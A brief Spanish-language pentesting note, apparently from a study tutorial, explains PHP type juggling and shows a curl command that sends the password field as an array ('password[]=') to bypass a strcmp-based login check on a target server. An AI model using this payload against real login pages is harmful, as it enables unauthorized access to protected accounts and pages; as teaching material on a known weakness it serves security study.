Type Juggling


Cuando un servidor valida una contraseña por ejemplo, usando strcompare es vulnerable a un Type juggling. En el siguiente ejemplo podremos ver como saltarnos la verificacion

┌──(kali@kali)-[~]
└─$ curl -s -X POST --data 'usuario=admin&password[]=contraseña' http://10.0.0.1/login.php


Los corchetes en el campo password haran que el strcompare falle dejandonos acceder a paginas sensibles
